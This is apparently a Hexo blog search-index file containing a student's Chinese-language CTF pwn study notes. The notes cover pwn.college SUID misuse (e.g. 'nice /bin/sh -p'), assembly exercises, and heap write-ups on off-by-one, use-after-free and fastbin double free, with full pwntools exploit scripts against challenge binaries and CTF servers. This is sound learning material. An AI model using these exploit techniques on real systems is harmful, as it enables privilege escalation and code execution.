{"meta":{"title":"Rin","subtitle":"","description":"","author":"Rin777","url":"https://fuurinko.github.io","root":"/"},"pages":[{"title":"Rin777","date":"2021-10-22T04:28:24.000Z","updated":"2021-11-11T16:27:47.142Z","comments":true,"path":"about/index.html","permalink":"https://fuurinko.github.io/about/index.html","excerpt":"","text":"About​ 双非本科20级在读，Pwn虽然很菜，但是还得学。 ​ Redrocker，不正点业余插画选手，半吊子手冲咖啡爱好者。最喜欢的音乐风格是爵士慢板，前卫金属和J-Rock。 Future ​ 在这个学期将基础的glibc吃透，稍微接触一下linux kernel。至少达到秒简单堆题的程度。 ​ 如果能混奖，可以试图申请一下安恒的实习。 ​ 无聊的时候可以练习一下基础的人物速写以及色彩。 ​ 还有就是希望在大学毕业前考过n2，现在也就勉强n3.5水平。"},{"title":"categories","date":"2014-12-22T04:39:04.000Z","updated":"2021-07-31T18:43:36.923Z","comments":true,"path":"categories/index.html","permalink":"https://fuurinko.github.io/categories/index.html","excerpt":"","text":""},{"title":"search","date":"2014-12-22T04:39:04.000Z","updated":"2021-07-31T18:46:23.612Z","comments":true,"path":"search/index.html","permalink":"https://fuurinko.github.io/search/index.html","excerpt":"","text":""},{"title":"tags","date":"2014-12-22T04:39:04.000Z","updated":"2021-07-31T18:44:04.740Z","comments":true,"path":"tags/index.html","permalink":"https://fuurinko.github.io/tags/index.html","excerpt":"","text":""},{"title":"friends","date":"2021-10-28T02:33:36.000Z","updated":"2021-10-29T05:50:39.292Z","comments":true,"path":"friends/index.html","permalink":"https://fuurinko.github.io/friends/index.html","excerpt":"","text":"cc_sakura:http://www.2323bb.ltdF@LLe0：https://blog.csdn.net/qq_36995313yyz:https://yyz9.cn古月浪子：https://blog.csdn.net/tqydyqtyk2eR0：https://www.yk2er0.funStar:https://www.star123.top"}],"posts":[{"title":"ProgramMisuse","slug":"pwncollege_ProgramMisuse","date":"2022-03-03T03:09:26.547Z","updated":"2022-03-03T03:11:03.802Z","comments":true,"path":"2022/03/03/pwncollege_ProgramMisuse/","link":"","permalink":"https://fuurinko.github.io/2022/03/03/pwncollege_ProgramMisuse/","excerpt":"","text":"​ 关于这个module，做出题目的话大致有两个思路，一个是利用/bin/sh 来对整个shell提权，另外一个是利用设置了suid的特殊程序来读取flag。一般来说是第二个方法比较简单，但是有时候只有第一个方法可以行得通。 Level1​ 没有看视频，并不知道这个Misuse是什么意义，但是level1只要执行给的程序就能get flag。 Level2​ 到第二题大概懂它的用意了，来补充一些知识吧。 ​ ​ 可以看到原本我们只用普通用户权限，但是由于可执行程序将 /usr/bin/more 设置为了超级权限，使得这个功能能够读取到flag的内容。 ​ 然后关于SUID，也就是Set uid ID。如果将对应位设置为S，就能够以可执行文件的owner权限执行它们。 ​ （SUID）仅对二进制可执行文件有效。 参考：[Linux 特殊权限 SUID,SGID,SBIT ] Level3-9​ xxx flag Level 10​ 指令为rev，所以对于获得的flag我们需要翻转一下，可以就直接用rev来。 Level 11​ 控制od的参数，并需要简单的脚本处理字符串的空格。 Level12-17​ 按照给的可执行文件来。 ​ 之前碰到这个问题的时候并咩有理解，现在算是理解了。 Level21ar -r a flag cat a Level27nice /bin/sh -p Level28 Level29​ 利用stdbuf设置输出缓冲为0，利用/bin/sh执行并提权。 Level30​ Level34![截屏2022-03-03 上午9.50.31](/Users/rin/Library/Application Support/typora-user-images/截屏2022-03-03 上午9.50.31.png) Level35![截屏2022-03-03 上午9.55.21](/Users/rin/Library/Application Support/typora-user-images/截屏2022-03-03 上午9.55.21.png) Level36 Level37 Level38![截屏2022-03-03 上午10.02.08](/Users/rin/Library/Application Support/typora-user-images/截屏2022-03-03 上午10.02.08.png) level39 Level41![截屏2022-03-03 上午10.17.52](/Users/rin/Library/Application Support/typora-user-images/截屏2022-03-03 上午10.17.52.png)Level42![截屏2022-03-03 上午10.20.23](/Users/rin/Library/Application Support/typora-user-images/截屏2022-03-03 上午10.20.23.png) Level45![截屏2022-03-03 上午10.52.14](/Users/rin/Library/Application Support/typora-user-images/截屏2022-03-03 上午10.52.14.png) Level47 Level49","categories":[],"tags":[{"name":"pwncollege","slug":"pwncollege","permalink":"https://fuurinko.github.io/tags/pwncollege/"}]},{"title":"Assembly_Refresher","slug":"pwncollege_Assembly_Refresher","date":"2022-01-29T13:51:29.070Z","updated":"2022-03-03T03:09:54.071Z","comments":true,"path":"2022/01/29/pwncollege_Assembly_Refresher/","link":"","permalink":"https://fuurinko.github.io/2022/01/29/pwncollege_Assembly_Refresher/","excerpt":"","text":"Level1需要设置*rdi = 0x1337， 如果是按照目的意思程序的汇编代码长这样子： .section .text .intel_syntax noprefix .global _start _start : mov rdi, 0x1337 但是可以直接用pwntools传输mov rdi, 0x1337这一句。 #!/usr/bin/env python3 import pwn pwn.context.log_level = \"INFO\" pwn.context.encoding = \"latin\" pwn.context.arch = \"amd64\" pwn.warnings.simplefilter(\"ignore\") assembly = \"\"\"mov rdi, 0x1337\"\"\" proc = pwn.process(\"/challenge/embryoasm_level1\") print(proc.readrepeat(1).decode()) proc.send(pwn.asm(assembly)) print(proc.readrepeat(1).decode()) 一个好用的exp，可以直接在非根目录下执行。 Level2add rdi, 0x331337 Level3 出师未捷身先死。 这里应该是对于汇编乘法对于寄存器的改变不太清楚 ​ 问题出在64位乘法会产生128位乘积，储存在rdx:rax中由于题目给的都是低32位的所以高32位全部是0，相当于mul之后rdx就变成了0，自然拿不到flag。 Level4​ 简单的64位汇编除法。相关的指令都已经给出了，抄作业就行。 Level5​ 依然是简单的除法，涉及到余数的处理。既然余数存在rdx，mov rax，rdx就行。 Level6​ 对于低位的数字运算（好烦）， rax = rdi modulo 256 ;2^8 rbx = rsi module 65536 ;2^16 ​ 所以edi和esi没有低八位吗？ 可能是吧，就像正常来说ebp和esp也没有低八位。 Level7​ 进行移位操作的练习，需要让rax为rdi的b3位的值 ​ Level8​ 与操作。 Level9​ 简单的奇偶判断，rax应该是1与rdi lsb异或后的结果。 Level10​ 简单的间接寻址。 ​ 要注意的是这里面有一些规范，大概就是不能mov [register],number;。也就是说涉及到寄存器间接寻址的操作都不能用立即数，而是需要利用寄存器。 Level11​ 涉及对byte，word ，dword和qword的size的理解。 Level12​ 我发现这个东西最恼人的不是做本身而是看题，不想看题好烦，题好长。但是只看问题又不能瞬间找到思路。。。 ​ 考点是利用寄存器间接寻址设置寄存器的值为指定值。（本来以为要考虑小端序造成的影响但其实不用考虑） ​ Level13​ 也就是一个按照地址偏移寻址的方式的理解。（基址寻址） Level14​ 对于出入栈相关指令的简单理解。 ​ 做题的时候卡了一下，因为没有正确理解题意，我以为是需要把栈顶值减去rdi后的值存到rax中就行，但是题意其实是让我们改变栈顶的值，所以我们将rax取出减rdi后还需要push回去。（还是吃了英语不好的亏捏） ​ Level15​ 还是围绕栈的先入后出的练习。 ​ ​ Level16​ 利用rsp来寻址。 ​ ​ 这里我把rdx清零了，属于是多此一举。 Level17​ 这题干怎么越来越长。 ​ 等会儿再做。 ​","categories":[],"tags":[{"name":"pwncollege","slug":"pwncollege","permalink":"https://fuurinko.github.io/tags/pwncollege/"}]},{"title":"positive sp value has been found","slug":"ida 7.0 for mac疑难杂症： positive sp value has been found","date":"2021-12-10T08:05:39.212Z","updated":"2021-12-10T14:30:30.224Z","comments":true,"path":"2021/12/10/ida 7.0 for mac疑难杂症： positive sp value has been found/","link":"","permalink":"https://fuurinko.github.io/2021/12/10/ida%207.0%20for%20mac%E7%96%91%E9%9A%BE%E6%9D%82%E7%97%87%EF%BC%9A%20positive%20sp%20value%20has%20been%20found/","excerpt":"","text":"0）​ 自从抛弃虚拟机，利用ida for mac+pwndocker实现完全mac环境以后，深觉优雅的同时，也遇见了不少坑。 ​ 其中ida的坑更是坑人于无形之中。因为如果不打开win的7.5（甚至7.6）做对比，你甚至不知道你遇见的一些奇怪的东西，是7.0 mac版特有的，已经被优化了的坑，还是自身逆向水平问题。 ​ 作为一个逆向废物，7.0 for mac属实是给本来就逆不出的我雪上加霜，但是就算是这样，我也宁愿花时间解决问题，而不是重新回到虚拟机win的悲惨过往，因为这不优雅。（优雅这个词到底害死了多少人捏） 1）​ 目前碰到的最多的一个问题，就是： ​ ​ 其实这个严格来讲算不上问题，因为你只需要找到main函数再f5，照样能够反编译，但是每次弹出的这个框就让我很恼火。所以解决问题的目标在于修改ida使得不再弹出这个框，而不是修改程序治标不治本捏。 ​ 对于问题本身，其实还是比较常规，只需要patch一下就好了。 ​ 我这里是_start()堆栈不平衡， ​ ​ 问题显然出在and rsp, 0FFFFFFFFFFFFFFF0h到start结束的这一大段。call完main以后居然没有retn。 ​ 首先报堆栈不平衡的错误大概就是因为ida要求stack pointer在函数开头和结束时相等。然后导致堆栈不平衡，通常是因为程序本身含有代码混淆/花指令，但是这是一道pwn题，为什么要在这种地方为难人。 ​ 我超，流汗黄豆原来是为难的意思。 ​ ​ 首先最让我疑惑的就是末尾的hlt指令，它取代了retn，然后它的意思是暂停指令，而不是返回。为什么这个地方会有一条这样的指令，是程序原本设计的还是ida反编译的问题？ ​ 稍微学习了一下，意识到start函数是被拆成了三个部分，所以只反编译一个部分肯定有问题。 ​ 但是虽然这样堆栈平衡，但是还是无法反编译，我也不清楚里面是不是有什么花指令。 ​ 和胖爷爷交流了一下，7.5及以上也会出现这个错误，但是完全可以反编译，并且start就是只有那么一段，没有后面的一堆东西。我不理解，我也修复不了，这篇文章毫无意义，但是学习了一些修复堆栈不平衡的方法（ ）参考​ IDA出现”sp-analysis failed”和F5(反编译)失败 ​","categories":[],"tags":[{"name":"逆向","slug":"逆向","permalink":"https://fuurinko.github.io/tags/%E9%80%86%E5%90%91/"}]},{"title":"off by one /chunk overlapping","slug":"off by one","date":"2021-12-08T02:30:31.469Z","updated":"2021-12-11T06:13:07.271Z","comments":true,"path":"2021/12/08/off by one/","link":"","permalink":"https://fuurinko.github.io/2021/12/08/off%20by%20one/","excerpt":"","text":"Off by one​ 单/空字节溢出攻击。 ​ 通常来说简单的off by one的漏洞点来自于编写时对边界控制不严格，导致每次输入的字符都能比规定的最大字符大那么一些（一个，或者几个）。这些字节溢出到物理地址相邻的下一个堆块，就能修改下一个chunk的size或者prev_inuse，通过这样的溢出，就能够整一些有趣的攻击。 ​ 通常单字节溢出的利用方式有如下几种： 溢出字节任意可控制字节：修改chunk size，造成堆叠，泄露或覆盖其他块的数据 溢出空字节：修改下一个chunk的prev_inuse，使得当前chunk状态为free，然后就可以：1）利用unlink进行攻击。2）对于下一个chunk来说，前一个chunk状态为free，自身的prev_size域启用，就能够伪造prev_size，改变前一个chunk的size，造成堆叠。 ​ ​ 从ctf-wiki上的一个简单的小例子开始： int my_gets(char *ptr,int size) { int i; for(i=0;i&lt;=size;i++)#栅栏错误 { ptr[i]=getchar(); } return i; } int main() { void *chunk1,*chunk2; chunk1=malloc(16); chunk2=malloc(16); puts(\"Get Input:\"); my_gets(chunk1,16); return 0; } 可以看到0x1994020的最低位被覆盖为了“61”，也就是a的小端序。当然这里是因为前一个chunk属于已分配状态，所以下一个chunk的prev_size被内存复用为了前一个chunk的内容。 以及这个字符串操作的例子 int main(void) { char buffer[40]=\"\"; void *chunk1; chunk1=malloc(24); puts(\"Get Input\"); gets(buffer); if(strlen(buffer)==24) { strcpy(chunk1,buffer); } return 0; } ![截屏2021-12-08 下午2.32.03](/Users/rin/Library/Application Support/typora-user-images/截屏2021-12-08 下午2.32.03.png) 这样next chunk的最低位就被0覆盖了。 chunk overlapping​ off by one的一个比较简单的利用就是chunk overlapping，简单讲就是通过溢出将chunk的size位修改，导致几个连续的chunk的内存空间发生了重叠，借此可以泄露一些数据或者覆盖chunk指针。 ​ 在举例子之前先复习一下与chunk size有关的一些操作。 ​ 获取当前chunk size ：通过堆指针的直接获取size位 ​ 获取当前chunk的use状态：通过当前chunk bp+chunk size获取下一个chunk的bp，然后获得prev_inuse位。 ​ 获取前一个chunk size ：利用当前chunk指针获取当前chunk的prev size。 ​ 获取下一个chunk的地址 ：利用当前chunk的size，下一个chunk地址即为：当前chunk指针+size。 ​ 获取前一个chunk的信息：先通过prev_size算出前一个chunl的堆指针，然后再利用前一个chunk的对指针来获得相关信息。 HITCON Trainging lab13题目链接 逆向 ​ edit()中，可以输入的字符比规定的多了一个字节。 ​ 程序并没有其他非常规的操作，就是单纯的off by one+chunk overlapping的利用。 #思路如下 add chunk0#0x18 add chunk1#0x10 edit chunk1 size to 0x41 free chunk1 add chunk2#size = 0x30 ​ 对于每个heap，程序会申请0x10作为heap结构，然后再申请size大小作为content。 create(0x18, \"dada\") # 0 create(0x10, \"ddaa\") # 1 这样操作以后内存应该是 chunk0/struct #0x10 chunk0/content #0x18 chunk1/struct#0x10 chunk1/content#0x10 ​ 申请的chunk0为0x18，原因是chunk都处于allocated状态，下一个chunk的prev_size无效，所以会被上一个chunk给内存复用。所以这里0x18是0x10的chunk0和0x8的chunk1的prevsize域。 申请两个heap后内存布局如图。 00-20是heap1的struct，20-40是heap1 content，其中，heap1 struct保存了指向heap1 content的指针。然后40-60是heap2 struct，60-80是heap2 content。 ​ 通过edit(0, \"/bin/sh\\x00\" + \"a\" * *0x*10 + \"\\x41\")将chunk1的size覆盖为0x41。 ​ 然后释放chunk1。 ​ 释放chunk1后的内存如图。 ​ 48开始可以直接理解为一个0x41的内存块。申请一个0x30的chunk2，属于fastbin，直接找到上次释放的0x41的chunk1分配给heap2，从048开始储存。我们的目的是修改chunk在结构chunk中保存content ptr为free_got_addr,并且要show（）出来，就要确保free_got_addr的位置是原来chunk1content开始的位置，也就是078。 ​ 所以只需要利用chunk2，在合适的地方将free got addr填写到chunk1的content ptr处，chunk2的size是多少其实关系不大，只要大于8就行。 ​ 当chunk1的content ptr被覆盖成了free got addr，show（1）实际上是读取这个ptr指向的地址的内容，也就是free的真实地址。同时也就相当于把chunk1的content ptr变为了free的真实地址，所以我们只需要修改chunk1的content，就能修改free的真实地址，将我们获得的system()的地址替换就行。 ​ 这样我们就获得了system·函数，要执行这个函数，只需要free一个含字符串\"/bin/sh\"的堆。也就是我们最开始add的工具人堆chunk0. ​ 这样基本就清楚了，但是还有一个问题我不是很理解，为什么在add chunk2的时候，chunk2的结构chunk的size位为0.或者说感觉根本没有结构chunk。 一些mzr​ 我超，我大彻大悟了。原来这么半年我一直理解错了何为堆叠。我理解错了啊！其实堆叠在动调中是看不到的，因为两个chunk完全被叠在了一起，就像我修改了chunk1的size1为41，这样heap1 struct和heap1 content就被叠成了0x41的空间，是叠成了0x41而不是struct把content覆盖了，如果这个时候申请内存空间的话，被叠起来的0x20的原本的content还是能够被申请到，所以我为什么chunk2的结构chunk离奇消失，就是因为被叠起来的0x20给隐藏了，然后再通过构造chunk2的content来伪造一个heap2struct，一切就说得通。 ​ 再稍微细节一些，从代码中我们可以发现当我们free被堆叠的chunk1时，其实这个过程释放了两个chunk，一个是结构体chunk，是0x20size，另外一个是被修改为0x41的struct，然后两个chunk释放的先后顺序是先释放content，再释放struct，也就是fastbin中顺序是 struct（0x41）=&gt;content(0x20) ​ 这时候申请0x30的chunk2，首先需要申请0x20的struct，也就是被堆叠的heap1的content（这里存疑，如果fastbin的适配是smallest fit，那无话可说，但是似乎是first fit），然后再申请0x30的content，也就是被修改的0x41，这样就说得通了。 ​ 但是很奇怪的一点，ctf-wiki上的说法却和这个不太一样，他认为将struct的size修改为0x41再free后，content就被struct吞并，而不是折叠了，free也只free一个0x41的chunk，而不是两个chunk。这个有待验证。 ​ 我想通了，同时释放两个chunk是题目特地设置的，并且是必须要先释放content再释放struct才能达到效果。如果是先释放struct，0x41就会把content的所有chunk头之类的一并认为是user space然后释放，这样也就不存在content，自然就只释放一个堆块了。 一些动调​ exp打了。发现打不通。动调发现free的got表确实被被修改成system()，但是调用的时候似乎出现了问题， ​ 先检查问题是不是出现在edit()上 ​ 跟进edit()，可以看到堆结构岿然不动，但是这是正常的。因为被修改的应该是free的got表，显然那种东西不会在这里。 ​ rdi指向free的got表地址，got指向真实地址，似乎没有任何问题。 ​ 我悟了，问题所在就是，就是啥呢，就是我本地libc的符号和程序使用的对不上。所以getshell失败。好了，我爬了。 ​ ​ （所以远端也打不通的原因是？） Asis CTF 2016 b00ksChecksec: ​ 代码的逻辑相对来说有一些复杂，但是还是比较好逆的，管理book的结构体大概长这样： struct booklist{ int idx; char *name; char *description; int size; } ​ 然后就是常规的菜单题的逻辑，也没有后门函数，估计需要ret2libc。值得注意的是：保护除了canary，其他都开了，这样的意义我尚且不清楚。 但是又联系到作者的名字是存贮在栈上的，也许可以利用。 ​ my_read函数有一个疑点就是每一次输入完成以后都会将buf的开始的地址至0。也就是每个利用到my_read()的地址，开头一个字节都是0。 ​ 为了验证这一操作，我们动态调试一下。 ​ 操作没有验证到，反而发现一个很怪的东西，就是储存name和des的chunk的size并不是我们输入的，而是限定的0x20，也就是32。这样就对应了add函数最的一段： ​ 对着伪代码摁逆确实没什么思路，但是动调一下思路就清晰了，程序将原本储存name或者des的堆指针赋给了size为0x20的chunk。但是这么做的目的何在？ ​ 没辙了，没有一点思路。 ​ （偷偷看一眼wp，只看逆向部分） ​ ​ （不懂，为什么对于边界的考虑不当，我觉得挺当的qwq。wp说存在空字节溢出，那估计又是我想错了。呜呜，我想通了。就是这个*buf = 0，我是傻逼。） ​ 其实是最后一位被清0了，但是我一直想的是原本的buf的开始被清0。现在想通了，其实特别简单，就是当i等于32的时候，buf还自增了，然后才判结束循环，这时候又将末位置0，就相当于多输了一个0，造成了空字节溢出。 ​ （wp关闭，开始瞎写时间） ToBeContinue 总结稍微总结一下昨天的学习吧。 其实虽然做了大概十个小时，但是只做了三个题不到，其中有大段时间在修复崩坏的环境以及研究pwndocker的一些问题，还有无谓的逆向，结果做不出。 并且对于hicton lab 13这道题 ，一个简单的概念卡了我很久。 现在看来，原因有2:我没有认真逆向。错过了很多我不以为意的内容，pwn题只要一个细节没有注意到就会被坑很久，所以还是那个老生常谈的话题，逆向。其实这个问题一方面是我逆向太不认真了，还有一方面是刷的题太少，甚至没办法总结规律。比如通过这两道题我总结出来的规律是：一般在普通的ptr = malloc（）之外还会特地创建一个struct用来管理每个表项的结构（我早就应该想到的），这个结构中通常会储存堆中的指针（我早就应该知道的，但是不知道为什么，我半年来一直没有意识到这个问题），所以我们覆盖的其实是堆struct chunk中储存的chunk bp，而不是实际的chunk bp（那个储存在哪里都不清楚捏）。 然后就是还是对chunk以及bin的一些操作或者说数据结构不是非常了解，导致概念不清。所以我暂停一天刷题，然后把malloc lab的分离适配搞完。 ​ ​ ​","categories":[],"tags":[{"name":"heap_pro","slug":"heap-pro","permalink":"https://fuurinko.github.io/tags/heap-pro/"}]},{"title":"fastbin attack","slug":"fastbin_attack","date":"2021-12-06T08:17:00.507Z","updated":"2021-12-08T03:15:33.777Z","comments":true,"path":"2021/12/06/fastbin_attack/","link":"","permalink":"https://fuurinko.github.io/2021/12/06/fastbin_attack/","excerpt":"","text":"fastbin？​ ​ 长度在32-160(32位系统是16-80)的free堆块。通过fastbinlist储存，单向链表，所以fast。fastbin attack一个最简单的利用就是UAF，其次就是fastbin double free。ctf pwn中与fastbin相关的还有就是在unsortedbin attack中涉及到的，也是ptmalloc机制中的一种的malloc_consolidate，其中也有可以攻击的机会，但是这个内容日后再在unsortedbin attack的笔记中再进行研究吧。 UAF​ 先从一个简单的例子开始： hacknote题目链接 ​ 菜单题，增删查改一应俱全，同时还有后门函数。那么利用思路就是利用悬垂指针，将后门函数的地址覆盖堆指针，使得调用print_note实则是在调用后门函数。 ​ 然后来详细分析一下题目的逻辑。 ​ 在add_note()中，对于每个note，程序分配了两个堆块，一个chunk储存结构体note的两个字段：printnote 的指针和content的指针，一共是8字节，另一个chunk则储存内容，size由用户输入决定。 ​ 每个note的chunk的地址是连续的。 ​ 我们连续申请两个note。 addnote(32, \"aaaa\") # add note 0 addnote(32, \"ddaa\") # add note 1 ​ 可以看到从158开始就是第一个chunk0的指针，8字节没有问题。然后168开始是content chunk。顺带一提0x11=是因为八字节的user space+8字节的chunk头以及最低位1的inuse。0x31则是因为对齐补全而多了八字节，也就是0x20（user space）+0x8（chunk头）+0x8（对齐）+最低位置1。 ​ 然后我们分别释放这两个chunk。 （然后发现fastbin是空的，free chunk跑Tcache了，有一点尴尬） ​ ​ 问题不大，pwndocker好处就体现在此。 ​ 可以看到两个note的四个堆块都被free了。并且处在不同的空闲链表中，但是这不是重点。 ​ 可以看到，被free的四个chunk的内存地址是连续的，所以当我们申请一个size为8的note2时，malloc会在空闲链表中寻找符合的free chunk，并且由于0x10和0x28的free chunk是分别的两条空闲链表，所以malloc会直接在0x10的链表中寻找，并从链表中取出尾部的free chunk，也就是刚才被释放的note1的指针chunk。 ​ fastbin的0x10中的两个free chunk都被分配了，一个储存指针，一个储存content。位置分别是0x5695c038和0x5695c0300。 ​ 也就是说，note2的content chunk，实则被分配到了note0的指针chunk的内存空间，而原本在这里储存的是note0的*put和 *content，也就是说，如果我们此刻执行print(note0),那么程序就会将执行函数与 *put指向的地址的操作绑定执行put。 ​ 此刻我们的*put指向的是cccc，那么我们只要把它换成后门函数地址，就能够getshell。 ​ 完整exp #!/usr/bin/env python # -*- coding: utf-8 -*- from pwn import * r = process([\"/glibc/2.23/32/lib/ld-2.23.so\", \"./hacknote\"], env={\"LD_PRELOAD\":\"/glibc/2.23/32/lib/libc.so.6\"}) #context.terminal = ['tmux', 'splitw', '-h'] ##context.update(arch='i386', os='linux') #context.log_level = \"debug\" def addnote(size, content): r.recvuntil(\":\") r.sendline(\"1\") r.recvuntil(\":\") r.sendline(str(size)) r.recvuntil(\":\") r.sendline(content) def delnote(idx): r.recvuntil(\":\") r.sendline(\"2\") r.recvuntil(\":\") r.sendline(str(idx)) def printnote(idx): r.recvuntil(\":\") r.sendline(\"3\") r.recvuntil(\":\") r.sendline(str(idx)) #gdb.attach(r) magic = 0x08048986 addnote(32, \"yuuu\") # add note 0 addnote(32, \"ddaa\") # add note 1 delnote(0) # delete note 0 delnote(1) # delete note 1 addnote(8, p32(0x8048986)) #gdb.attach(r) printnote(0) r.interactive() pwnable_hacknote​ 好，写了很多。然后再稍微加强一点，来看pwnable.tw上的hacknote。 ​ 题目链接 ​ 源码和hitcon lab相比就是缺少了后门函数，需要ret2libc。直接利用之前的思路，将*put覆盖为print的地址和puts的got表，泄露puts的虚拟地址，然后经典ret2libc，拿到ststem的地址，传参的话还是一样的思路。 #!/usr/bin/env python # -*- coding: utf-8 -*- from pwn import * r = process([\"/glibc/2.23/32/lib/ld-2.23.so\", \"./hacknote\"], env={\"LD_PRELOAD\":\"/ctf/work/work/challenge/pwnable/hacknote/libc_32.so.6\"}) r = remote('chall.pwnable.tw',10102) libc = ELF(\"./libc_32.so.6\") #context.terminal = ['tmux', 'splitw', '-h'] #context.update(arch='i386', os='linux') #context.log_level = \"debug\" print_addr = 0x804862b puts_got = 0x804A024 def addnote(size, content): r.recvuntil(\":\") r.sendline(\"1\") r.recvuntil(\":\") r.sendline(str(size)) r.recvuntil(\":\") r.sendline(content) def delnote(idx): r.recvuntil(\":\") r.sendline(\"2\") r.recvuntil(\":\") r.sendline(str(idx)) def printnote(idx): r.recvuntil(\":\") r.sendline(\"3\") r.recvuntil(\":\") r.sendline(str(idx)) #gdb.attach(r) magic = 0x08048986 addnote(32, \"yuuu\") # add note 0 addnote(32, \"ddaa\") # add note 1 delnote(0) # delete note 0 delnote(1) # delete note 1 addnote(8,p32(print_addr)+p32(puts_got)) printnote(0) puts_addr = u32(r.recv(4)) print(hex(puts_addr)) libc_base = puts_addr - libc.symbols['puts'] system_addr = libc.symbols['system'] - libc_base delnote(2) addnote(8,flat([system_addr,\"||sh\"])) #gdb.attach(r) printnote(0) r.interactive() FastbinDoubleFree​ ​ 关于fastbin attack，利用其实非常的简单，就是使得被二次释放的chunk不与main_arena直接指向就行。这样就会造成被二次释放的chunk被再次插入空闲链表，使得下一次申请合适size的chunk时会申请到被二次释放的chunk，而chunk的fd又能够随意修改，造成任意地址写与执行。 ​ 从数据结构的角度看，fastbin与其他bin不太一样的就是，它是由单向链表管理，chunk只有一个fd，链表头为main_arena（关于这里一直不太理解main_arena是怎样管理所有bin并通过它得到bin的偏移的），新free的chunk会被插入表头，而取出时遵循的是frist fit原则，也就是从头开始检查，并取出第一个符合条件的chunk。 高效，但是势必会造成一定的fragment，但是由于fastbin chunk本身的size足够小，所以可以忽略。 ​ 例子来源于之前做过的一些题： metasequoia_2020_samsara​ 题目链接 ​ 逻辑比较好逆，如果v8等于deadbeef就能getshell。 ​ ​ 然后变量的栈布局是这样的 ​ ​ 可以看到v7和v8只差了8字节，如果能够溢出或者其他操作将v8修改就能拿到flag。然后从上面的逻辑我们知道v7的真实地址，以及我们能够对v7对地址写入任意内容。当然这里不能像栈溢出那样直接溢出v7，将内容写入v8.（具体的原因我其实不是很清楚，是有溢出的检测还是啥捏)，而是需要利用某种方式使得能够任意地址i写 ​ 然后又已知这道题的考点是fastbin double free，这个利用方式正好能造成任意地址写。 ​ 那么思路大概是 add chunk0 add chunk1 add chunk2#防止free chunk被top chunk合并 free chunk0 free chunk1 free chunk0 ​ 此刻fastbin链表大致如下： main_arena =&gt; chunk0 =&gt; chunk1 =&gt;chuk0 ​ 然后此时再 add chunk3 #申请到的是chunk0的内存空间 edit chunk3#在fd位填入v8的地址（可以通过打印v7的地址获得） 然后链表大概长这样： main_arena =&gt; v8 =&gt;chunk1 =&gt;chunk0（这里是错的，后面有更正） 所以此时只要再add chunk3，就能申请到v8的内存空间，并进行任意写。 ​ 然后就可以直接写exp了；def部分是直接复制我以前做的时候的exp，那个exp又是我不知道从哪里复制过来的qwq。 ​ （话说上次看大佬写的calc的exp，突然觉得就算是简单的py脚本也能够写得非常抽象捏，什么类型转换数组处理还有各种循环看得我头疼捏，真离谱捏。） ​ （写exp的时候发现一个非常畸形的问题，就是我的delete函数无论怎样都会报错，但是先进的vscode完全没有给我一个合理的错误解释，后来在容器中执行了才给我一条有价值的报错。大概就是因为原本的exp的tab和空格混用了，改一下就行，其实之前也遇到过类似的问题，但是当时没有完全意识到问题所在并且不知道为什么就解决了所以没有留下印象） #!/usr/bin/env python # -*- coding: utf-8 -*- from pwn import * #p = process('./metasequoia_2020_samsara') #p = process([\"/glibc/2.23/32/lib/ld-2.23.so\", \"./metasequoia_2020_samsara\"], env={\"LD_PRELOAD\":\"/glibc/2.23/32/lib/libc.so.6\"}) p = remote('node4.buuoj.cn',27450) #context.terminal = ['tmux', 'splitw', '-h'] #context.update(arch='i386', os='linux') #context.log_level = \"debug\" elf = ELF('./metasequoia_2020_samsara') def add(): p.recvline(\"choice &gt; \") p.sendline('1') def dele(idx): p.recvline(\"choice &gt; \") p.sendline('2') p.sendafter(':',str(idx)) def edit(idx,content): p.recvline(\"choice &gt; \") p.sendline('3') p.sendafter(':',str(idx)) p.sendafter(':',content) def show(): p.recvline(\"choice &gt; \") p.sendline('4') def move(dest): p.recvline(\"choice &gt; \") p.sendline('5') p.sendafter('?',str(dest)) #double free add()#0 add()#1 dele(0) dele(1) dele(0) #gdb.attach(p) add()#2--&gt;0 add()#3 --&gt;1 move(0x20) show()#get the addr of v7 v7_addr = u64(p.recv(8)) v8_addr = v7_addr - 8 edit(2,p64(v8_addr)) edit(3,\"0xDEADBEEF\") p.sendlineafter(\"choice &gt;\",'6') p.interactive() ​ 打不通，并且因为未知原因（大概率是elf头的ld不匹配），导致本地无法调试，去网上搜了一下wp，发现有这么几个个细节我没有注意，或者说想错了。 ​ 在进行double free的时候，我只预先申请了两个chunk，并且将前一个申请的chunk double free了。但是wp预先申请了三个chunk，然后我意识到，第三个申请的chunk很有可能是防止之前被free的两个chunk被top chunk合并，之前刷堆题的时候经常碰到这一点，但是太久没做了，有些忘了。这里是没有注意到的细节。 ​ 然后是想错了的部分，可以看到我之前的wp中的思路是这样的： ​ 错误所在就是，修改free chunk0的fd之后，它在fastbin中的位置应当还是 main_arena =&gt; chunk1 =&gt;chunk0(v8) ，也不知道为什么我会以为新的fd会被重新插入链表。 ​ 然后按照first fit原则，我们连续add两个chunk，就能够申请到v8的内存空间了。后面的内容就问题不大了。 ​ 所以更正后的exp大概是这样： add()#0 add()#1 add()#2,防止与top chunk合并 dele(0) dele(1) dele(0) #gdb.attach(p) add()#3--&gt;0 add()#4 --&gt;1 move(0x20) show()#get the addr of v7 v7_addr = u64(p.recv(8)) v8_addr = v7_addr - 0x8 edit(3,p64(v8_addr)) add()#5 add()#6 edit(6,0xDEADBEEF) 总结​ 感觉每个入门堆题的人首先开始做的题目都是fastbin attack以及UAF，因为确实相对来说简单易懂。但是反观我半年前写的fastbin attack的wp，我的评价是：狗屁不通。 ​ 所以我对于堆题，或者是整个ctf pwn的学习其实是走了很多弯路的。比如说对于动调的惧怕，导致我做了很多题，但又没完全做。比如我学习堆题，却不愿意沉下心来，从了解ptmalloc开始，而是摁刷题，导致知识点被割裂得完全串联不上，学完就忘。现在从csapp malloc lab开始逐步琢磨glibc，然后睡前再看半个小时源码剖析，再辅以ctf pwn的一些题目的分析，对于各种知识点好歹是有了一个足以将它们串联起来的体系，从而做题是不再那么一头雾水了。如果在半年前我能意识到这一点就好了。但是我还是觉得任何在pwn学习过程中踩过的坑，无论是知识点本身的坑，还是学习方案上的坑，都是宝贵的，无可替代的学习经验捏。","categories":[],"tags":[{"name":"heap_pro","slug":"heap-pro","permalink":"https://fuurinko.github.io/tags/heap-pro/"}]},{"title":"csapp malloc lab","slug":"malloc lab","date":"2021-12-03T08:46:22.570Z","updated":"2021-12-10T02:44:24.285Z","comments":true,"path":"2021/12/03/malloc lab/","link":"","permalink":"https://fuurinko.github.io/2021/12/03/malloc%20lab/","excerpt":"","text":"0）前言​ 鸽了三个月的malloc lab，作为复习堆题的开始。 ​ 